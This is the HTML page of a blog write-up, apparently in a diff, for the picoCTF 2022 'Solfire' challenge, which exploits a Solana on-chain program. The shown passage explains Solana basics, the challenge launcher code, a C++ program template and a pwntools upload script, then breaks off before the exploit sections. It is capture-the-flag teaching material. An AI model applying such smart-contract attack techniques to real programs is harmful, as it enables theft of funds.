@@ -1,0 +1,1283 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>picoCTF 2022 : Solfire write-up | reductor’s blog</title>
+<meta name="generator" content="Jekyll v3.9.0">
+<meta property="og:title" content="picoCTF 2022 : Solfire write-up">
+<meta property="og:locale" content="en_US">
+<meta name="description" content="This is a CTF Security challenge which involves exploiting a Solana on-chain program.">
+<meta property="og:description" content="This is a CTF Security challenge which involves exploiting a Solana on-chain program.">
+<link rel="canonical" href="https://reductor.dev/ctf/2022/04/05/solfire-writeup.html">
+<meta property="og:url" content="https://reductor.dev/ctf/2022/04/05/solfire-writeup.html">
+<meta property="og:site_name" content="reductor’s blog">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2022-04-05T04:53:02+00:00">
+<meta name="twitter:card" content="summary">
+<meta property="twitter:title" content="picoCTF 2022 : Solfire write-up">
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-05T04:53:02+00:00","datePublished":"2022-04-05T04:53:02+00:00","description":"This is a CTF Security challenge which involves exploiting a Solana on-chain program.","headline":"picoCTF 2022 : Solfire write-up","mainEntityOfPage":{"@type":"WebPage","@id":"https://reductor.dev/ctf/2022/04/05/solfire-writeup.html"},"url":"https://reductor.dev/ctf/2022/04/05/solfire-writeup.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css">
+<link type="application/atom+xml" rel="alternate" href="https://reductor.dev/feed.xml" title="reductor's blog">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-HTPYZN8N34"></script>
+<script>
+  window['ga-disable-G-HTPYZN8N34'] = window.doNotTrack === "1" || navigator.doNotTrack === "1" || navigator.doNotTrack === "yes" || navigator.msDoNotTrack === "1";
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){window.dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-HTPYZN8N34');
+</script>
+</head>
+<body>
+<header class="site-header" role="banner">
+
+  <div class="wrapper">
+<a class="site-title" rel="author" href="/">reductor's blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger">
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewbox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"></path>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav>
+</div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">picoCTF 2022 : Solfire write-up</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2022-04-05T04:53:02+00:00" itemprop="datePublished">Apr 5, 2022
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>This is a CTF Security challenge which involves exploiting a Solana on-chain program.</p>
+
+<p>NOTE: This challenge is now part of the <a href="https://play.picoctf.org/practice?page=1&search=solfire">picoGym practice challenges</a></p>
+
+<p><strong>Points</strong>: 500</p>
+
+<p><strong>Category</strong>: Binary exploitation (pwn)</p>
+
+<p><strong>Challenge Author</strong>: <a href="https://twitter.com/notdeghost?lang=en">Robert Chen (NotDeGhost)</a></p>
+
+<p><strong>Description</strong></p>
+
+<blockquote>
+  <p>What is debt? A perversion of a promise?
+Surely one has to pay one’s debts.</p>
+</blockquote>
+
+<p><strong>TL;DR Solution</strong></p>
+<blockquote>
+  <p>Exploit a buffer overflow and incorrectly sized account to trick withdraw into thinking it has more money in it then expected.</p>
+</blockquote>
+
+<h2 id="contents">Contents</h2>
+
+<ul>
+  <li><a href="#introduction-to-solana">Introduction to Solana</a></li>
+  <li>Understanding
+    <ul>
+      <li><a href="#examining-the-launcher-application">Examining the launcher application</a></li>
+      <li><a href="#creating-a-template-to-start-things-off">Creating a template to start things off</a></li>
+      <li><a href="#getting-logging-going">Getting logging going</a></li>
+      <li><a href="#decompiling-the-the-solfire-binary">Decompiling the solfire binary</a></li>
+      <li><a href="#calling-solfire-from-the-solve-program">Calling solfire from the solve program</a></li>
+    </ul>
+  </li>
+  <li>Solve Attempts
+    <ul>
+      <li><a href="#deposit-bug">Deposit bug</a></li>
+      <li><a href="#buffer-overflow-bug">Buffer overflow bug</a></li>
+      <li><a href="#owner-check-bug">Owner check bug</a></li>
+      <li><a href="#account-transfer-attempt">Account transfer attempt</a></li>
+      <li><a href="#create-a-new-account-with-no-space-the-solution">Creating a new account with no space (The solution)</a></li>
+    </ul>
+  </li>
+  <li><a href="#closing-thoughts">Closing thoughts</a></li>
+</ul>
+
+<h2 id="introduction-to-solana">Introduction to Solana</h2>
+
+<p>Before digging into this challenge I had little to no experience with Cryptocurrency security or programming, so spent a bit of time ramping up on how Solana works.</p>
+
+<p>In order to understand this write-up you’ll need a basic understanding of some of the terminology, sorry for anyone who has more experience with this I’ve probably butchered the explanations.</p>
+
+<p>Solana has accounts which are used to store state, this state could be some binary, an image, or a program, they could also store no state and just be used as a reference address.</p>
+
+<p>These accounts also contain the actual currency in Lamports which is the equivalent of 0.000000001 SOL.</p>
+
+<p>All accounts have an address which is a 256-bit (32-byte) public key often represented in a base-58 encoding, they also have an owner which is the only one allowed to change the data on that account.</p>
+
+<p>An important part of Solana programming is the signing system, which is powered by program derived addresses (PDA), these are addresses which get created with a combination of a public key and a seed.</p>
+
+<p>The seed is used to offset the public key (which is on an elliptic), the offset of the seed might still end up on the same elliptic curve (which means a private key could exist out there for it) so part of finding a PDA with a seed involves adding an additional bump byte to it which would push it off the curve if it did end up on it.</p>
+
+<p>Solana programs are a compiled ELF binary where the instructions are compiled into eBPF, which is a small effective instruction set typically used for writing sandboxed things within the Linux Kernel.</p>
+
+<p>These are typically called on-chain programs because they live on the blockchain, additionally there are native programs, which are special programs inside solana that run on the Solana clusters, such as the system program which can be used to create new accounts, transfer accounts, etc.</p>
+
+<p>Solana programs get executed using instructions, which provide a data and an ordered list of account meta’s which it will execute on.</p>
+
+<p>Instructions get executed as part of a transaction when any instruction in a transaction fails then the entire transaction fails and none of the changes it performed get committed.</p>
+
+<p>On top of this when a program is executed Solana will check to see that sum of all Lamports matches and no new Lamports have been created out of no where.</p>
+
+<p>A lot more detailed and accurate information can be found in the <a href="https://solanacookbook.com/">Solana Cookbook</a></p>
+
+<h2 id="examining-the-launcher-application">Examining the launcher application</h2>
+
+<p>Inside the challenge package there is a launcher program which is the main entry point which you connect to, it launches a virtual Solana environment using the <a href="https://github.com/neodyme-labs/solana-poc-framework">Solana PoC framework</a>.</p>
+
+<p>The program accepts for TCP connections on port 8080, the first thing it does is request a length for a new program to be loaded into the environment.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"len: "</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="n">reader</span><span class="nf">.read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">line</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="k">let</span> <span class="n">len</span><span class="p">:</span> <span class="nb">usize</span> <span class="o">=</span> <span class="n">line</span><span class="nf">.trim</span><span class="p">()</span><span class="nf">.parse</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
+
+<span class="k">let</span> <span class="k">mut</span> <span class="n">solve_so</span> <span class="o">=</span> <span class="nd">vec!</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span> <span class="n">len</span><span class="p">];</span>
+<span class="n">reader</span><span class="nf">.read_exact</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">solve_so</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>Then it loads this program and the <code class="language-plaintext highlighter-rouge">solfire.so</code></p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="n">program_pubkey</span> <span class="o">=</span> <span class="n">env</span><span class="nf">.deploy_program</span><span class="p">(</span><span class="s">"./solfire.so"</span><span class="p">);</span>
+<span class="k">let</span> <span class="n">solve_pubkey</span> <span class="o">=</span> <span class="n">env</span><span class="nf">.deploy_program</span><span class="p">(</span><span class="n">solve_file</span><span class="nf">.path</span><span class="p">());</span>
+</code></pre></div></div>
+
+<p>The public key for these programs are calculated based on a SHA256 hash of it’s contents, for <code class="language-plaintext highlighter-rouge">solfire.so</code> this will never change, but will keep changing anytime the solve file you input above changes.</p>
+
+<p>After this the user account will be created which is the main account used in this challenge it is the only signing key provided to the call into the solve program, adn is later validated to see if it has enough lamports to determine if the challenge is solved.</p>
+
+<p>With all 3 of these addresses/accounts the addresses will be sent to the connection</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"program pubkey: {}"</span><span class="p">,</span> <span class="n">program_pubkey</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"solve pubkey: {}"</span><span class="p">,</span> <span class="n">solve_pubkey</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"user pubkey: {}"</span><span class="p">,</span> <span class="n">user</span><span class="nf">.pubkey</span><span class="p">())</span><span class="o">?</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>A program derived address is then created/found with the seed of “vault”</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">let</span> <span class="p">(</span><span class="n">vault</span><span class="p">,</span> <span class="mi">_</span><span class="p">)</span> <span class="o">=</span> <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">find_program_address</span><span class="p">(</span><span class="o">&amp;</span><span class="p">[</span><span class="s">"vault"</span><span class="nf">.as_ref</span><span class="p">()],</span> <span class="o">&amp;</span><span class="n">program_pubkey</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now all the relevant accounts have been setup, the user account will be provided with 10 Lamports and the Vault will be provided 1,000,000 Lamports.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="n">INIT_BAL</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
+<span class="k">const</span> <span class="n">VAULT_BAL</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">1_000_000</span><span class="p">;</span>
+<span class="n">env</span><span class="nf">.execute_as_transaction</span><span class="p">(</span>
+        <span class="o">&amp;</span><span class="p">[</span><span class="nf">transfer</span><span class="p">(</span>
+            <span class="o">&amp;</span><span class="n">env</span><span class="nf">.payer</span><span class="p">()</span><span class="nf">.pubkey</span><span class="p">(),</span>
+            <span class="o">&amp;</span><span class="n">user</span><span class="nf">.pubkey</span><span class="p">(),</span>
+            <span class="n">INIT_BAL</span><span class="p">,</span>
+        <span class="p">),</span>
+        <span class="nf">transfer</span><span class="p">(</span>
+            <span class="o">&amp;</span><span class="n">env</span><span class="nf">.payer</span><span class="p">()</span><span class="nf">.pubkey</span><span class="p">(),</span>
+            <span class="o">&amp;</span><span class="n">vault</span><span class="p">,</span>
+            <span class="n">VAULT_BAL</span><span class="p">,</span>
+        <span class="p">)</span>
+        <span class="p">],</span>
+        <span class="o">&amp;</span><span class="p">[</span><span class="o">&amp;</span><span class="n">env</span><span class="nf">.payer</span><span class="p">()],</span>
+    <span class="p">);</span>
+</code></pre></div></div>
+
+<p>Now that all the accounts are setup a new transaction starts to be formed, in order to create this transaction a list of accounts needs to be provided, this is done by providing the number of accounts then the public key and meta data for each account, the meta data indicates if it’s writeable or a signer.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">assert</span><span class="o">!</span><span class="p">(</span><span class="n">reader</span><span class="nf">.read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">line</span><span class="p">)</span><span class="o">?</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+<span class="k">let</span> <span class="n">accts</span><span class="p">:</span> <span class="nb">usize</span> <span class="o">=</span> <span class="n">line</span><span class="nf">.trim</span><span class="p">()</span><span class="nf">.parse</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
+
+<span class="k">let</span> <span class="k">mut</span> <span class="n">metas</span> <span class="o">=</span> <span class="nn">Vec</span><span class="p">::</span><span class="o">&lt;</span><span class="n">AccountMeta</span><span class="o">&gt;</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+<span class="k">for</span> <span class="mi">_</span> <span class="n">in</span> <span class="mi">0</span><span class="o">..</span><span class="n">accts</span> <span class="p">{</span>
+    <span class="n">line</span><span class="nf">.clear</span><span class="p">();</span>
+    <span class="k">assert</span><span class="o">!</span><span class="p">(</span><span class="n">reader</span><span class="nf">.read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">line</span><span class="p">)</span><span class="o">?</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">it</span> <span class="o">=</span> <span class="n">line</span><span class="nf">.trim</span><span class="p">()</span><span class="nf">.split</span><span class="p">(</span><span class="sc">' '</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="n">meta</span> <span class="o">=</span> <span class="n">it</span><span class="nf">.next</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">pubkey</span> <span class="o">=</span> <span class="nn">Pubkey</span><span class="p">::</span><span class="nf">from_str</span><span class="p">(</span><span class="n">it</span><span class="nf">.next</span><span class="p">()</span><span class="nf">.unwrap</span><span class="p">())</span><span class="o">?</span><span class="p">;</span>
+
+    <span class="k">let</span> <span class="n">is_signer</span> <span class="o">=</span> <span class="n">meta</span><span class="nf">.contains</span><span class="p">(</span><span class="sc">'s'</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">is_writable</span> <span class="o">=</span> <span class="n">meta</span><span class="nf">.contains</span><span class="p">(</span><span class="sc">'w'</span><span class="p">);</span>
+
+    <span class="k">if</span> <span class="n">is_writable</span> <span class="p">{</span>
+        <span class="n">metas</span><span class="nf">.push</span><span class="p">(</span><span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new</span><span class="p">(</span><span class="n">pubkey</span><span class="p">,</span> <span class="n">is_signer</span><span class="p">));</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="n">metas</span><span class="nf">.push</span><span class="p">(</span><span class="nn">AccountMeta</span><span class="p">::</span><span class="nf">new_readonly</span><span class="p">(</span><span class="n">pubkey</span><span class="p">,</span> <span class="n">is_signer</span><span class="p">));</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The example input for this would be something like this, which sets up an account as writeable and a signer.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ws f15bksYCXxexNSgkBT9nNk16FviVWBSmxCjkRVnTkSQi
+</code></pre></div></div>
+
+<p>If you need to provide an account which isn’t writeable or a signer then you can also just provide anything for the meta data, for example this would be an account which is only read from</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>q f15bksYCXxexNSgkBT9nNk16FviVWBSmxCjkRVnTkSQi
+</code></pre></div></div>
+
+<p>Finally the transaction can be provided some data to work on, which is prefixed with another size.</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">assert</span><span class="o">!</span><span class="p">(</span><span class="n">reader</span><span class="nf">.read_line</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">line</span><span class="p">)</span><span class="o">?</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
+<span class="k">let</span> <span class="n">ix_data_len</span><span class="p">:</span> <span class="nb">usize</span> <span class="o">=</span> <span class="n">line</span><span class="nf">.trim</span><span class="p">()</span><span class="nf">.parse</span><span class="p">()</span><span class="o">?</span><span class="p">;</span>
+<span class="k">let</span> <span class="k">mut</span> <span class="n">ix_data</span> <span class="o">=</span> <span class="nd">vec!</span><span class="p">[</span><span class="mi">0</span><span class="p">;</span> <span class="n">ix_data_len</span><span class="p">];</span>
+
+<span class="n">reader</span><span class="nf">.read_exact</span><span class="p">(</span><span class="o">&amp;</span><span class="k">mut</span> <span class="n">ix_data</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>After all of this setup the solve program we provided get’s executed in a transaction.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>let ix = Instruction::new_with_bytes(
+    solve_pubkey,
+    &amp;ix_data,
+    metas
+);
+
+let tx = Transaction::new_signed_with_payer(
+    &amp;[ix],
+    Some(&amp;user.pubkey()),
+    &amp;vec![&amp;user],
+    env.get_recent_blockhash(),
+);
+
+env.execute_transaction(tx);
+</code></pre></div></div>
+
+<p>After all of this the check for the flag occurs, which validates that the user account managed to get additional lamports</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">const</span> <span class="n">TARGET_AMT</span><span class="p">:</span> <span class="nb">u64</span> <span class="o">=</span> <span class="mi">50_000</span><span class="p">;</span>
+
+<span class="k">let</span> <span class="n">user_bal</span> <span class="o">=</span> <span class="n">env</span><span class="nf">.get_account</span><span class="p">(</span><span class="n">user</span><span class="nf">.pubkey</span><span class="p">())</span><span class="nf">.unwrap</span><span class="p">()</span><span class="py">.lamports</span><span class="p">;</span>
+<span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"user bal: {:?}"</span><span class="p">,</span> <span class="n">user_bal</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+<span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"vault bal: {:?}"</span><span class="p">,</span> <span class="n">env</span><span class="nf">.get_account</span><span class="p">(</span><span class="n">vault</span><span class="p">)</span><span class="nf">.unwrap</span><span class="p">()</span><span class="py">.lamports</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+
+<span class="k">if</span> <span class="n">user_bal</span> <span class="o">&gt;</span> <span class="n">TARGET_AMT</span> <span class="p">{</span>
+    <span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"congrats!"</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="k">if</span> <span class="k">let</span> <span class="nf">Ok</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">=</span> <span class="nn">env</span><span class="p">::</span><span class="nf">var</span><span class="p">(</span><span class="s">"FLAG"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"flag: {:?}"</span><span class="p">,</span> <span class="n">flag</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+        <span class="nd">writeln!</span><span class="p">(</span><span class="n">socket</span><span class="p">,</span> <span class="s">"flag not found, please contact admin"</span><span class="p">)</span><span class="o">?</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>To summarize we must provide a Solana program which will transfer 50,000 Lamports to the user.</p>
+
+<h2 id="creating-a-template-to-start-things-off">Creating a template to start things off</h2>
+
+<p>As seen from the loader program the first thing we need is a Solana program, in order to this I grabbed the <a href="https://docs.solana.com/cli/install-solana-cli-tools">Solana SDK</a> and the <a href="https://github.com/solana-labs/example-helloworld">Hello world example</a>.</p>
+
+<p>I used the C example and changed it into a C++ version, primarily because I’m more of a C++ developer and the Rust version binaries appeared to be be fairly big that they created some issues in my test environment.</p>
+
+<p>In order to change the C example into a C++ example simply rename it to the <code class="language-plaintext highlighter-rouge">.c</code> file to <code class="language-plaintext highlighter-rouge">.cc</code></p>
+
+<p>Here is the simplest starting program that I created</p>
+
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;solana_sdk.h&gt;
+</span>
+<span class="c1">// I should have used 'class' to trigger the OOP haters :D</span>
+<span class="k">struct</span> <span class="nc">Solution</span>
+<span class="p">{</span>
+	<span class="n">SolAccountInfo</span> <span class="n">accounts_</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
+	<span class="n">SolParameters</span> <span class="n">params</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">ka</span> <span class="o">=</span> <span class="n">accounts_</span> <span class="p">};</span>
+
+	<span class="kt">uint64_t</span> <span class="n">run</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span> <span class="n">input</span><span class="p">)</span> 
+	<span class="p">{</span>
+		<span class="n">sol_log</span><span class="p">(</span><span class="s">"Solution::run"</span><span class="p">);</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">sol_deserialize</span><span class="p">(</span><span class="n">input</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">params</span><span class="p">,</span> <span class="n">SOL_ARRAY_SIZE</span><span class="p">(</span><span class="n">accounts_</span><span class="p">)))</span> <span class="p">{</span>
+			<span class="k">return</span> <span class="n">ERROR_INVALID_ARGUMENT</span><span class="p">;</span>
+		<span class="p">}</span>
+
+		<span class="k">return</span> <span class="n">SUCCESS</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">};</span>
+
+<span class="k">extern</span> <span class="kt">uint64_t</span> <span class="nf">entrypoint</span><span class="p">(</span><span class="k">const</span> <span class="kt">uint8_t</span> <span class="o">*</span><span class="n">input</span><span class="p">)</span> <span class="p">{</span>
+	<span class="n">Solution</span> <span class="n">solution</span><span class="p">;</span>
+	<span class="k">return</span> <span class="n">solution</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Now we need a basic script to get up and going with this</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">args</span><span class="p">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s">'localhost'</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">8080</span><span class="p">)</span>
+<span class="n">solve_so</span> <span class="o">=</span> <span class="s">'./example/example-helloworld-master/dist/program/helloworld.so'</span>
+
+<span class="n">io</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+
+<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">solve_so</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+    <span class="n">solve_so_data</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">'len'</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">solve_so_data</span><span class="p">)).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">solve_so_data</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'program pubkey: '</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+<span class="n">program_pubkey</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">program_pubkey</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'solve pubkey: '</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+<span class="n">solve_pubkey</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">solve_pubkey</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">'user pubkey: '</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+<span class="n">user_pubkey</span> <span class="o">=</span> <span class="n">io</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">user_pubkey</span><span class="p">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+
+<span class="n">accounts</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'ws'</span><span class="p">,</span> <span class="n">user_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'q'</span><span class="p">,</span> <span class="n">program_pubkey</span><span class="p">),</span>
+    <span class="p">(</span><span class="sa">b</span><span class="s">'q'</span><span class="p">,</span> <span class="n">solve_pubkey</span><span class="p">),</span>
+<span class="p">]</span>
+
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">accounts</span><span class="p">)).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+<span class="k">for</span> <span class="n">access</span><span class="p">,</span> <span class="n">key</span> <span class="ow">in</span> <span class="n">accounts</span><span class="p">:</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">access</span> <span class="o">+</span> <span class="sa">b</span><span class="s">' '</span> <span class="o">+</span> <span class="n">key</span><span class="p">)</span>
+
+<span class="n">ix_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>
+<span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ix_data</span><span class="p">)).</span><span class="n">encode</span><span class="p">(</span><span class="s">'ascii'</span><span class="p">))</span>
+<span class="n">io</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">ix_data</span><span class="p">)</span>
+<span class="n">output</span> <span class="o">=</span> <span class="n">printable</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvall</span><span class="p">()).</span><span class="n">decode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Now once running this script you’ll probably notice the log generated with <code class="language-plaintext highlighter-rouge">sol_log</code> isn’t included, which is going to be vital for getting anywhere on in this challenge, so the next thing I did was get logging going.</p>
+
+<h2 id="getting-logging-going">Getting logging going</h2>
+
+<p>The first thing I wanted to add was making the outside caller in the pool output logs for errors raised. (I’m sure there are nicer ways, but I’m no Rust guru)</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="n">panic</span><span class="p">;</span>
+</code></pre></div></div>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">stream</span> <span class="n">in</span> <span class="n">listener</span><span class="nf">.incoming</span><span class="p">()</span> <span class="p">{</span>
